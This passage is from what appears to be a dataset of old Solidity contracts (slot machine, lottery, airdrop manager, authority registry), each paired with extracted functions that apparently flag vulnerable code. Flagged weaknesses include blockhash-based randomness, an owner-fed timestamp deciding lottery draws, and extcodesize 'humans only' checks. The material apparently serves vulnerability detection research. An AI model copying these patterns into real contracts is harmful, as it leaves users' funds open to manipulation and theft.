_tokenAmount)\n public\n onlyOwner\n {\n validTokenBet[_tokenAmount] = true;\n }\n function pauseGame() public onlyOwner {\n gameActive = false;\n }\n function resumeGame() public onlyOwner {\n gameActive = true;\n }\n function changeOwner(address _newOwner) public onlyOwner {\n owner = _newOwner;\n }\n function changeBankroll(address _newBankroll) public onlyOwner {\n bankroll = _newBankroll;\n }\n function divertDividendsToBankroll()\n public\n onlyOwner\n {\n bankroll.transfer(address(this).balance);\n }\n function _zthToken(address _tokenContract) private view returns (bool) {\n return _tokenContract == ZTHTKNADDR;\n }\n}\nlibrary SafeMath {\n function mul(uint a, uint b) internal pure returns (uint) {\n if (a == 0) {\n return 0;\n }\n uint c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint a, uint b) internal pure returns (uint) {\n uint c = a / b;\n return c;\n }\n function sub(uint a, uint b) internal pure returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function add(uint a, uint b) internal pure returns (uint) {\n uint c = a + b;\n assert(c >= a);\n return c;\n }\n}",
  "extract_feature": [
    "function _spinTokens(TKN _tkn) private {\nrequire(gameActive);\nrequire(_zthToken(msg.sender));\nrequire(validTokenBet[_tkn.value]);\nrequire(jackpotGuard(_tkn.value));\nrequire(_tkn.value < ((2 ** 200) - 1));\nrequire(block.number < ((2 ** 56) - 1));\naddress _customerAddress = _tkn.sender;\nuint _wagered = _tkn.value;\nplayerSpin memory spin = playerSpins[_tkn.sender];\ncontractBalance = contractBalance.add(_wagered);\nrequire(block.number != spin.blockn);\nif (spin.blockn != 0) {\n_finishSpin(_tkn.sender);\n}\nspin.blockn = uint56(block.number);\nspin.tokenValue = uint200(_wagered);\nplayerSpins[_tkn.sender] = spin;\ntotalSpins += 1;\ntotalZTHWagered += _wagered;\nemit TokensWagered(_customerAddress, _wagered);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc68750a970a4fdc0b27"
  },
  "filename": "1482.sol",
  "content": "pragma solidity ^0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract Claimable is Ownable {\n address public pendingOwner;\n modifier onlyPendingOwner() {\n require(msg.sender == pendingOwner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n pendingOwner = newOwner;\n }\n function claimOwnership() onlyPendingOwner public {\n emit OwnershipTransferred(owner, pendingOwner);\n owner = pendingOwner;\n pendingOwner = address(0);\n }\n}\ncontract SimpleFlyDropToken is Claimable {\n using SafeMath for uint256;\n ERC20 internal erc20tk;\n function setToken(address _token) onlyOwner public {\n require(_token != address(0));\n erc20tk = ERC20(_token);\n }\n function multiSend(address[] _destAddrs, uint256[] _values) onlyOwner public returns (uint256) {\n require(_destAddrs.length == _values.length);\n uint256 i = 0;\n for (; i < _destAddrs.length; i = i.add(1)) {\n if (!erc20tk.transfer(_destAddrs[i], _values[i])) {\n break;\n }\n }\n return (i);\n }\n}\ncontract DelayedClaimable is Claimable {\n uint256 public end;\n uint256 public start;\n function setLimits(uint256 _start, uint256 _end) onlyOwner public {\n require(_start <= _end);\n end = _end;\n start = _start;\n }\n function claimOwnership() onlyPendingOwner public {\n require((block.number <= end) && (block.number >= start));\n emit OwnershipTransferred(owner, pendingOwner);\n owner = pendingOwner;\n pendingOwner = address(0);\n end = 0;\n }\n}\ncontract FlyDropTokenMgr is DelayedClaimable {\n using SafeMath for uint256;\n address[] dropTokenAddrs;\n SimpleFlyDropToken currentDropTokenContract;\n function prepare(uint256 _rand,\n address _from,\n address _token,\n uint256 _value) onlyOwner public returns (bool) {\n require(_token != address(0));\n require(_from != address(0));\n require(_rand > 0);\n if (ERC20(_token).allowance(_from, this) < _value) {\n return false;\n }\n if (_rand > dropTokenAddrs.length) {\n SimpleFlyDropToken dropTokenContract = new SimpleFlyDropToken();\n dropTokenAddrs.push(address(dropTokenContract));\n currentDropTokenContract = dropTokenContract;\n } else {\n currentDropTokenContract = SimpleFlyDropToken(dropTokenAddrs[_rand.sub(1)]);\n }\n currentDropTokenContract.setToken(_token);\n return ERC20(_token).transferFrom(_from, currentDropTokenContract, _value);\n }\n function flyDrop(address[] _destAddrs, uint256[] _values) onlyOwner public returns (uint256) {\n require(address(currentDropTokenContract) != address(0));\n return currentDropTokenContract.multiSend(_destAddrs, _values);\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}",
  "extract_feature": [
    "function claimOwnership() onlyPendingOwner public {\nrequire((block.number <= end) && (block.number >= start));\nemit OwnershipTransferred(owner, pendingOwner);\nowner = pendingOwner;\npendingOwner = address(0);\nend = 0;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc68750a970a4fdc0b28"
  },
  "filename": "1546.sol",
  "content": "pragma solidity ^0.4.24;\ncontract ZTHReceivingContract {\n function tokenFallback(address _from, uint _value, bytes _data) public returns (bool);\n}\ncontract ZTHInterface {\n function transfer(address _to, uint _value) public returns (bool);\n function approve(address spender, uint tokens) public returns (bool);\n}\ncontract Zlots is ZTHReceivingContract {\n using SafeMath for uint;\n address private owner;\n address private bankroll;\n uint totalSpins;\n uint totalZTHWagered;\n uint contractBalance;\n bool public gameActive;\n address private ZTHTKNADDR;\n address private ZTHBANKROLL;\n ZTHInterface private ZTHTKN;\n mapping (uint => bool) validTokenBet;\n event HouseRetrievedTake(\n uint timeTaken,\n uint tokensWithdrawn\n );\n event TokensWagered(\n address _wagerer,\n uint _wagered\n );\n event LogResult(\n address _wagerer,\n uint _result,\n uint _profit,\n uint _wagered,\n uint _category,\n bool _win\n );\n event Loss(address _wagerer, uint _block);\n event ThreeMoonJackpot(address _wagerer, uint _block);\n event TwoMoonPrize(address _wagerer, uint _block);\n event ZTHJackpot(address _wagerer, uint _block);\n event ThreeZSymbols(address _wagerer, uint _block);\n event ThreeTSymbols(address _wagerer, uint _block);\n event ThreeHSymbols(address _wagerer, uint _block);\n event ThreeEtherIcons(address _wagerer, uint _block);\n event ThreeGreenPyramids(address _wagerer, uint _block);\n event ThreeGoldPyramids(address _wagerer, uint _block);\n event ThreeWhitePyramids(address _wagerer, uint _block);\n event OneMoonPrize(address _wagerer, uint _block);\n event OneOfEachPyramidPrize(address _wagerer, uint _block);\n event TwoZSymbols(address _wagerer, uint _block);\n event TwoTSymbols(address _wagerer, uint _block);\n event TwoHSymbols(address _wagerer, uint _block);\n event TwoEtherIcons(address _wagerer, uint _block);\n event TwoGreenPyramids(address _wagerer, uint _block);\n event TwoGoldPyramids(address _wagerer, uint _block);\n event TwoWhitePyramids(address _wagerer, uint _block);\n event SpinConcluded(address _wagerer, uint _block);\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n modifier onlyBankroll {\n require(msg.sender == bankroll);\n _;\n }\n modifier onlyOwnerOrBankroll {\n require(msg.sender == owner || msg.sender == bankroll);\n _;\n }\n modifier gameIsActive {\n require(gameActive == true);\n _;\n }\n constructor(address ZethrAddress, address BankrollAddress) public {\n ZTHTKNADDR = ZethrAddress;\n ZTHBANKROLL = BankrollAddress;\n owner = msg.sender;\n bankroll = ZTHBANKROLL;\n ZTHTKN = ZTHInterface(ZTHTKNADDR);\n ZTHTKN.approve(ZTHBANKROLL, 2**256 - 1);\n ZTHTKN.approve(owner, 2**256 - 1);\n validTokenBet[5e18] = true;\n validTokenBet[10e18] = true;\n validTokenBet[25e18] = true;\n validTokenBet[50e18] = true;\n gameActive = true;\n }\n function() public payable { }\n struct TKN { address sender; uint value; }\n function tokenFallback(address _from, uint _value, bytes ) public returns (bool){\n if (_from == bankroll) {\n contractBalance = contractBalance.add(_value);\n return true;\n } else {\n TKN memory _tkn;\n _tkn.sender = _from;\n _tkn.value = _value;\n _spinTokens(_tkn);\n return true;\n }\n }\n struct playerSpin {\n uint200 tokenValue;\n uint56 blockn;\n }\n mapping(address => playerSpin) public playerSpins;\n function _spinTokens(TKN _tkn) private {\n require(gameActive);\n require(_zthToken(msg.sender));\n require(validTokenBet[_tkn.value]);\n require(jackpotGuard(_tkn.value));\n require(_tkn.value < ((2 ** 200) - 1));\n require(block.number < ((2 ** 56) - 1));\n address _customerAddress = _tkn.sender;\n uint _wagered = _tkn.value;\n playerSpin memory spin = playerSpins[_tkn.sender];\n require(block.number != spin.blockn);\n if (spin.blockn != 0) {\n _finishSpin(_tkn.sender);\n }\n spin.blockn = uint56(block.number);\n spin.tokenValue = uint200(_wagered);\n playerSpins[_tkn.sender] = spin;\n totalSpins += 1;\n totalZTHWagered += _wagered;\n emit TokensWagered(_customerAddress, _wagered);\n }\n function finishSpin() public\n gameIsActive\n returns (uint)\n {\n return _finishSpin(msg.sender);\n }\n function _finishSpin(address target)\n private returns (uint)\n {\n playerSpin memory spin = playerSpins[target];\n require(spin.tokenValue > 0);\n require(spin.blockn != block.number);\n uint profit = 0;\n uint category = 0;\n uint result;\n if (block.number - spin.blockn > 255) {\n result = 999999;\n } else {\n result = random(1000000, spin.blockn, target);\n }\n if (result > 476661) {\n contractBalance = contractBalance.add(spin.tokenValue);\n emit Loss(target, spin.blockn);\n emit LogResult(target, result, profit, spin.tokenValue, category, false);\n } else {\n if (result < 1) {\n profit = SafeMath.mul(spin.tokenValue, 500);\n category = 1;\n emit ThreeMoonJackpot(target, spin.blockn);\n } else\n if (result < 298) {\n profit = SafeMath.mul(spin.tokenValue, 232);\n category = 2;\n emit TwoMoonPrize(target, spin.blockn);\n } else\n if (result < 3127) {\n profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 232), 10);\n category = 3;\n emit ZTHJackpot(target, spin.blockn);\n } else\n if (result < 5956) {\n profit = SafeMath.mul(spin.tokenValue, 25);\n category = 4;\n emit ThreeZSymbols(target, spin.blockn);\n } else\n if (result < 8785) {\n profit = SafeMath.mul(spin.tokenValue, 25);\n category = 5;\n emit ThreeTSymbols(target, spin.blockn);\n } else\n if (result < 11614) {\n profit = SafeMath.mul(spin.tokenValue, 25);\n category = 6;\n emit ThreeHSymbols(target, spin.blockn);\n } else\n if (result < 14443) {\n profit = SafeMath.mul(spin.tokenValue, 50);\n category = 7;\n emit ThreeEtherIcons(target, spin.blockn);\n } else\n if (result < 17272) {\n profit = SafeMath.mul(spin.tokenValue, 40);\n category = 8;\n emit ThreeGreenPyramids(target, spin.blockn);\n } else\n if (result < 20101) {\n profit = SafeMath.mul(spin.tokenValue, 20);\n category = 9;\n emit ThreeGoldPyramids(target, spin.blockn);\n } else\n if (result < 22929) {\n profit = SafeMath.mul(spin.tokenValue, 20);\n category = 10;\n emit ThreeWhitePyramids(target, spin.blockn);\n } else\n if (result < 52332) {\n profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 125),10);\n category = 11;\n emit OneMoonPrize(target, spin.blockn);\n } else\n if (result < 120225) {\n profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 15),10);\n category = 12;\n emit OneOfEachPyramidPrize(target, spin.blockn);\n } else\n if (result < 171146) {\n profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 232),100);\n category = 13;\n emit TwoZSymbols(target, spin.blockn);\n } else\n if (result < 222067) {\n profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 232),100);\n category = 14;\n emit TwoTSymbols(target, spin.blockn);\n } else\n if (result < 272988) {\n profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 232),100);\n category = 15;\n emit TwoHSymbols(target, spin.blockn);\n } else\n if (result < 323909) {\n profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 375),100);\n category = 16;\n emit TwoEtherIcons(target, spin.blockn);\n } else\n if (result < 374830) {\n profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 35),10);\n category = 17;\n emit TwoGreenPyramids(target, spin.blockn);\n } else\n if (result < 425751) {\n profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 225),100);\n category = 18;\n emit TwoGoldPyramids(target, spin.blockn);\n } else {\n profit = SafeMath.mul(spin.tokenValue, 2);\n category = 19;\n emit TwoWhitePyramids(target, spin.blockn);\n }\n emit LogResult(target, result, profit, spin.tokenValue, category, true);\n contractBalance = contractBalance.sub(profit);\n ZTHTKN.transfer(target, profit);\n }\n playerSpins[target] = playerSpin(uint200(0), uint56(0));\n emit SpinConcluded(target, spin.blockn);\n return result;\n }\n function jackpotGuard(uint _wager)\n private\n view\n returns (bool)\n {\n uint maxProfit = SafeMath.mul(_wager, 500);\n uint ninetyContractBalance = SafeMath.mul(SafeMath.div(contractBalance, 10), 9);\n return (maxProfit <= ninetyContractBalance);\n }\n function maxRandom(uint blockn, address entropy) private view returns (uint256 randomNumber) {\n return uint256(keccak256(\n abi.encodePacked(\n address(this),\n blockhash(blockn),\n entropy)\n ));\n }\n function random(uint256 upper, uint256 blockn, address entropy) internal view returns (uint256 randomNumber) {\n return maxRandom(blockn, entropy) % upper;\n }\n function balanceOf() public view returns (uint) {\n return contractBalance;\n }\n function addNewBetAmount(uint _tokenAmount)\n public\n onlyOwner\n {\n validTokenBet[_tokenAmount] = true;\n }\n function pauseGame() public onlyOwner {\n gameActive = false;\n }\n function resumeGame() public onlyOwner {\n gameActive = true;\n }\n function changeOwner(address _newOwner) public onlyOwner {\n owner = _newOwner;\n }\n function changeBankroll(address _newBankroll) public onlyOwner {\n bankroll = _newBankroll;\n }\n function divertDividendsToBankroll()\n public\n onlyOwner\n {\n bankroll.transfer(address(this).balance);\n }\n function _zthToken(address _tokenContract) private view returns (bool) {\n return _tokenContract == ZTHTKNADDR;\n }\n}\nlibrary SafeMath {\n function mul(uint a, uint b) internal pure returns (uint) {\n if (a == 0) {\n return 0;\n }\n uint c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint a, uint b) internal pure returns (uint) {\n uint c = a / b;\n return c;\n }\n function sub(uint a, uint b) internal pure returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function add(uint a, uint b) internal pure returns (uint) {\n uint c = a + b;\n assert(c >= a);\n return c;\n }\n}",
  "extract_feature": [
    "function _spinTokens(TKN _tkn) private {\nrequire(gameActive);\nrequire(_zthToken(msg.sender));\nrequire(validTokenBet[_tkn.value]);\nrequire(jackpotGuard(_tkn.value));\nrequire(_tkn.value < ((2 ** 200) - 1));\nrequire(block.number < ((2 ** 56) - 1));\naddress _customerAddress = _tkn.sender;\nuint _wagered = _tkn.value;\nplayerSpin memory spin = playerSpins[_tkn.sender];\nrequire(block.number != spin.blockn);\nif (spin.blockn != 0) {\n_finishSpin(_tkn.sender);\n}\nspin.blockn = uint56(block.number);\nspin.tokenValue = uint200(_wagered);\nplayerSpins[_tkn.sender] = spin;\ntotalSpins += 1;\ntotalZTHWagered += _wagered;\nemit TokensWagered(_customerAddress, _wagered);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc68750a970a4fdc0b29"
  },
  "filename": "1567.sol",
  "content": "pragma solidity ^0.4.24;\ncontract Ownable {\n address public owner;\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n owner = newOwner;\n }\n}\ncontract GuessEthEvents{\n event drawLog(uint,uint,uint);\n event guessEvt(\n address indexed playerAddr,\n uint[] numbers, uint amount\n );\n event winnersEvt(\n uint blockNumber,\n address indexed playerAddr,\n uint amount,\n uint winAmount\n );\n event withdrawEvt(\n address indexed to,\n uint256 value\n );\n event drawEvt(\n uint indexed blocknumberr,\n uint number\n );\n event sponseEvt(\n address indexed addr,\n uint amount\n );\n event pauseGameEvt(\n bool pause\n );\n event setOddsEvt(\n uint odds\n );\n}\ncontract GuessEth is Ownable,GuessEthEvents{\n using SafeMath for uint;\n struct bnumber{\n address addr;\n uint number;\n uint value;\n int8 result;\n uint prize;\n }\n mapping(uint => bnumber[]) public bets;\n mapping(uint => address) public betNumber;\n mapping(address => uint[]) private playerBetBNumber;\n struct winner{\n bool result;\n uint prize;\n }\n mapping(uint => winner[]) private winners;\n mapping(uint => uint) private winResult;\n address private wallet1;\n address private wallet2;\n uint private predictBlockInterval=3;\n uint public odds=45;\n uint public minBetVal=1 finney;\n uint public blockInterval=500;\n uint public curOpenBNumber=0;\n uint public numberRange=100;\n bool public gamePaused=false;\n mapping(address => uint) Sponsors;\n uint public balanceOfSPS=0;\n address[] public SponsorAddresses;\n uint reservefund=30 ether;\n modifier isHuman() {\n address _addr = msg.sender;\n uint256 _codeLength;\n assembly {_codeLength := extcodesize(_addr)}\n require(_codeLength == 0, \"sorry humans only\");\n _;\n }\n constructor(address _wallet1,address _wallet2) public{\n wallet1=_wallet1;\n wallet2=_wallet2;\n curOpenBNumber=blockInterval*(block.number.div(blockInterval));\n }\n function pauseGame(bool _status) public onlyOwner returns(bool){\n gamePaused=_status;\n emit pauseGameEvt(_status);\n }\n function setOdds(uint _odds) isHuman() public onlyOwner returns(bool){\n odds = _odds;\n emit setOddsEvt(_odds);\n }\n function setReservefund(uint _reservefund) isHuman() public onlyOwner returns(bool){\n reservefund = _reservefund * 1 ether;\n }\n function getTargetBNumber() view isHuman() public returns(uint){\n uint n;\n n=blockInterval*(predictBlockInterval + block.number/blockInterval);\n return n;\n }\n function guess(uint[] _numbers) payable isHuman() public returns(uint){\n require(msg.value >= _numbers.length.mul(minBetVal));\n uint n=blockInterval*(predictBlockInterval + block.number/blockInterval);\n for(uint _i=0;_i < _numbers.length;_i++){\n bnumber memory b;\n b.addr=msg.sender;\n b.number=_numbers[_i];\n b.value=msg.value/_numbers.length;\n b.result=-1;\n bets[n].push(b);\n }\n if(utils.inArray(playerBetBNumber[msg.sender],n)==false){\n playerBetBNumber[msg.sender].push(n);\n }\n emit guessEvt(msg.sender,_numbers, msg.value);\n return _numbers.length;\n }\n function getPlayerGuessNumbers() view public returns (uint[],uint[],uint256[],int8[],uint[]){\n uint _c=0;\n uint _i=0;\n uint _j=0;\n uint _bnumber;\n uint limitRows=100;\n while(_i < playerBetBNumber[msg.sender].length){\n _bnumber=playerBetBNumber[msg.sender][_i];\n for(_j=0 ; _j < bets[_bnumber].length && _c < limitRows ; _j++){\n if(msg.sender==bets[_bnumber][_j].addr){\n _c++;\n }\n }\n _i++;\n }\n uint[] memory _blockNumbers=new uint[](_c);\n uint[] memory _numbers=new uint[](_c);\n uint[] memory _values=new uint[](_c);\n int8[] memory _result=new int8[](_c);\n uint[] memory _prize=new uint[](_c);\n if(_c<=0){\n return(_blockNumbers,_numbers,_values,_result,_prize);\n }\n uint _count=0;\n for(_i=0 ; _i < playerBetBNumber[msg.sender].length ; _i++){\n _bnumber=playerBetBNumber[msg.sender][_i];\n for(_j=0 ; _j < bets[_bnumber].length && _count < limitRows ; _j++){\n if(bets[_bnumber][_j].addr == msg.sender){\n _blockNumbers[_count] = _bnumber;\n _numbers[_count] = bets[_bnumber][_j].number;\n _values[_count] = bets[_bnumber][_j].value;\n _result[_count] = bets[_bnumber][_j].result;\n _prize[_count] = bets[_bnumber][_j].prize;\n _count++;\n }\n }\n }\n return(_blockNumbers,_numbers,_values,_result,_prize);\n }\n function draw(uint _blockNumber,uint _blockTimestamp) public onlyOwner returns (uint){\n require(block.number >= curOpenBNumber + blockInterval);\n curOpenBNumber=_blockNumber;\n uint result=_blockTimestamp % numberRange;\n winResult[_blockNumber]=result;\n for(uint _i=0;_i < bets[_blockNumber].length;_i++){\n if(bets[_blockNumber][_i].number==result){\n bets[_blockNumber][_i].result = 1;\n bets[_blockNumber][_i].prize = bets[_blockNumber][_i].value * odds;\n emit winnersEvt(_blockNumber,bets[_blockNumber][_i].addr,bets[_blockNumber][_i].value,bets[_blockNumber][_i].prize);\n withdraw(bets[_blockNumber][_i].addr,bets[_blockNumber][_i].prize);\n }else{\n bets[_blockNumber][_i].result = 0;\n bets[_blockNumber][_i].prize = 0;\n }\n }\n emit drawEvt(_blockNumber,curOpenBNumber);\n return result;\n }\n function getWinners(uint _blockNumber) view public returns(address[],uint[]){\n uint _count=winners[_blockNumber].length;\n address[] memory _addresses = new address[](_count);\n uint[] memory _prize = new uint[](_count);\n uint _i=0;\n for(_i=0;_i<_count;_i++){\n _prize[_i] = winners[_blockNumber][_i].prize;\n }\n return (_addresses,_prize);\n }\n function getWinResults(uint _blockNumber) view public returns(uint){\n return winResult[_blockNumber];\n }\n function withdraw(address _to,uint amount) public onlyOwner returns(bool){\n require(address(this).balance.sub(amount) > 0);\n _to.transfer(amount);\n emit withdrawEvt(_to,amount);\n return true;\n }\n function invest() isHuman payable public returns(uint){\n require(msg.value >= 0.1 ether,\"Minima amoun:0.1 ether\");\n Sponsors[msg.sender] = Sponsors[msg.sender].add(msg.value);\n balanceOfSPS = balanceOfSPS.add(msg.value);\n if(!utils.inArray(SponsorAddresses,msg.sender)){\n SponsorAddresses.push(msg.sender);\n emit sponseEvt(msg.sender,msg.value);\n }\n return Sponsors[msg.sender];\n }\n function distribute() public onlyOwner{\n if(address(this).balance < reservefund){\n return;\n }\n uint availableProfits=address(this).balance.sub(reservefund);\n uint prft1=availableProfits.mul(3 ether).div(10 ether);\n uint prft2=availableProfits.sub(prft1);\n uint _val=0;\n uint _i=0;\n for(_i=0;_i<SponsorAddresses.length;_i++){\n _val = (prft1 * Sponsors[SponsorAddresses[_i]]) / (balanceOfSPS);\n SponsorAddresses[_i].transfer(_val);\n }\n uint w1p=prft2.mul(3 ether).div(10 ether);\n wallet1.transfer(w1p);\n wallet2.transfer(prft2.sub(w1p));\n }\n function sharesOfSPS() view public returns(uint,uint){\n return (Sponsors[msg.sender],balanceOfSPS);\n }\n function getAllSponsors() view public returns(address[],uint[],uint){\n uint _i=0;\n uint _c=0;\n for(_i=0;_i<SponsorAddresses.length;_i++){\n _c+=1;\n }\n address[] memory addrs=new address[](_c);\n uint[] memory amounts=new uint[](_c);\n for(_i=0;_i<SponsorAddresses.length;_i++){\n addrs[_i]=SponsorAddresses[_i];\n amounts[_i]=Sponsors[SponsorAddresses[_i]];\n }\n return(addrs,amounts,balanceOfSPS);\n }\n function() payable isHuman() public {\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\nlibrary utils{\n function inArray(uint[] _arr,uint _val) internal pure returns(bool){\n for(uint _i=0;_i< _arr.length;_i++){\n if(_arr[_i]==_val){\n return true;\n break;\n }\n }\n return false;\n }\n function inArray(address[] _arr,address _val) internal pure returns(bool){\n for(uint _i=0;_i< _arr.length;_i++){\n if(_arr[_i]==_val){\n return true;\n break;\n }\n }\n return false;\n }\n}",
  "extract_feature": [
    "function getTargetBNumber() view isHuman() public returns(uint){\nuint n;\nn=blockInterval*(predictBlockInterval + block.number/blockInterval);\nreturn n;\n}",
    "function guess(uint[] _numbers) payable isHuman() public returns(uint){\nrequire(msg.value >= _numbers.length.mul(minBetVal));\nuint n=blockInterval*(predictBlockInterval + block.number/blockInterval);\nfor(uint _i=0;_i < _numbers.length;_i++){\nbnumber memory b;\nb.addr=msg.sender;\nb.number=_numbers[_i];\nb.value=msg.value/_numbers.length;\nb.result=-1;\nbets[n].push(b);\n}\nif(utils.inArray(playerBetBNumber[msg.sender],n)==false){\nplayerBetBNumber[msg.sender].push(n);\n}\nemit guessEvt(msg.sender,_numbers, msg.value);\nreturn _numbers.length;\n}",
    "function draw(uint _blockNumber,uint _blockTimestamp) public onlyOwner returns (uint){\nrequire(block.number >= curOpenBNumber + blockInterval);\ncurOpenBNumber=_blockNumber;\nuint result=_blockTimestamp % numberRange;\nwinResult[_blockNumber]=result;\nfor(uint _i=0;_i < bets[_blockNumber].length;_i++){\nif(bets[_blockNumber][_i].number==result){\nbets[_blockNumber][_i].result = 1;\nbets[_blockNumber][_i].prize = bets[_blockNumber][_i].value * odds;\nemit winnersEvt(_blockNumber,bets[_blockNumber][_i].addr,bets[_blockNumber][_i].value,bets[_blockNumber][_i].prize);\nwithdraw(bets[_blockNumber][_i].addr,bets[_blockNumber][_i].prize);\n}else{\nbets[_blockNumber][_i].result = 0;\nbets[_blockNumber][_i].prize = 0;\n}\n}\nemit drawEvt(_blockNumber,curOpenBNumber);\nreturn result;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc68750a970a4fdc0b2a"
  },
  "filename": "157.sol",
  "content": "pragma solidity ^0.4.17;\ncontract SingleSourceAuthority {\n struct Authority {\n bool valid;\n address authorizedBy;\n address revokedBy;\n uint validFrom;\n uint validTo;\n }\n address public rootAuthority;\n mapping(address => Authority) public authorities;\n modifier restricted() {\n if (msg.sender == rootAuthority)\n _;\n }\n function SingleSourceAuthority() public {\n rootAuthority = msg.sender;\n }\n function changeRootAuthority(address newRootAuthorityAddress)\n public\n restricted()\n {\n rootAuthority = newRootAuthorityAddress;\n }\n function isRootAuthority(address authorityAddress)\n public\n view\n returns (bool)\n {\n if (authorityAddress == rootAuthority) {\n return true;\n } else {\n return false;\n }\n }\n function isValidAuthority(address authorityAddress, uint blockNumber)\n public\n view\n returns (bool)\n {\n Authority storage authority = authorities[authorityAddress];\n if (authority.valid) {\n if (authority.validFrom <= blockNumber && (authority.validTo == 0 || authority.validTo >= blockNumber)) {\n return true;\n } else {\n return false;\n }\n } else {\n return false;\n }\n }\n function approveAuthority(address authorityAddress) public restricted() {\n Authority memory authority = Authority({\n valid: true,\n authorizedBy: msg.sender,\n revokedBy: 0x0,\n validFrom: block.number,\n validTo: 0\n });\n authorities[authorityAddress] = authority;\n }\n function revokeAuthority(address authorityAddress, uint blockNumber) public restricted() {\n Authority storage authority = authorities[authorityAddress];\n authority.revokedBy = msg.sender;\n authority.validTo = blockNumber;\n }\n}",
  "extract_feature": [
    "function approveAuthority(address authorityAddress) public restricted() {\nAuthority memory authority = Authority({\nvalid: true,\nauthorizedBy: msg.sender,\nrevokedBy: 0x0,\nvalidFrom: block.number,\nvalidTo: 0\n});\nauthorities[authorityAddress] = authority;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc68750a970a4fdc0b2b"
  },
  "filename": "164.sol",
  "content": "pragma solidity ^0.4.24;\ncontract BREBuy {\n struct ContractParam {\n uint32 totalSize ;\n uint256 singlePrice;\n uint8 pumpRate;\n bool hasChange;\n }\n address owner = 0x0;\n uint32 gameIndex = 0;\n uint256 totalPrice= 0;\n bool isLock = false;\n ContractParam public setConfig;\n ContractParam public curConfig;\n address[] public addressArray = new address[](0);\n event openLockEvent();\n event addPlayerEvent(uint32 gameIndex,address player);\n event gameOverEvent(uint32 gameIndex,uint32 totalSize,uint256 singlePrice,uint8 pumpRate,address winAddr,uint overTime);\n event stopGameEvent(uint totalBalace,uint totalSize,uint price);\n constructor ( uint32 _totalSize,\n uint256 _singlePrice\n ) public {\n owner = msg.sender;\n setConfig = ContractParam(_totalSize,_singlePrice * 1 finney ,5,false);\n curConfig = ContractParam(_totalSize,_singlePrice * 1 finney ,5,false);\n startNewGame();\n }\n modifier onlyOwner {\n require(msg.sender == owner,\"only owner can call this function\");\n _;\n }\n modifier notLock {\n require(isLock == false,\"contract current is lock status\");\n _;\n }\n function isNotContract(address addr) private view returns (bool) {\n uint size;\n assembly { size := extcodesize(addr) }\n return size <= 0;\n }\n function updateLock(bool b) onlyOwner public {\n require(isLock != b,\" updateLock new status == old status\");\n isLock = b;\n if(isLock) {\n stopGame();\n }else{\n startNewGame();\n emit openLockEvent();\n }\n }\n function stopGame() onlyOwner private {\n if(addressArray.length <= 0) {\n return;\n }\n uint totalBalace = address(this).balance;\n uint price = totalBalace / addressArray.length;\n for(uint i = 0; i < addressArray.length; i++) {\n address curPlayer = addressArray[i];\n curPlayer.transfer(price);\n }\n emit stopGameEvent(totalBalace,addressArray.length,price);\n addressArray.length=0;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n if (newOwner != address(0)) {\n owner = newOwner;\n }\n }\n function changeConfig( uint32 _totalSize,uint256 _singlePrice,uint8 _pumpRate) onlyOwner public payable {\n curConfig.hasChange = true;\n if(setConfig.totalSize != _totalSize) {\n setConfig.totalSize = _totalSize;\n }\n if(setConfig.pumpRate != _pumpRate){\n setConfig.pumpRate = _pumpRate;\n }\n if(setConfig.singlePrice != _singlePrice * 1 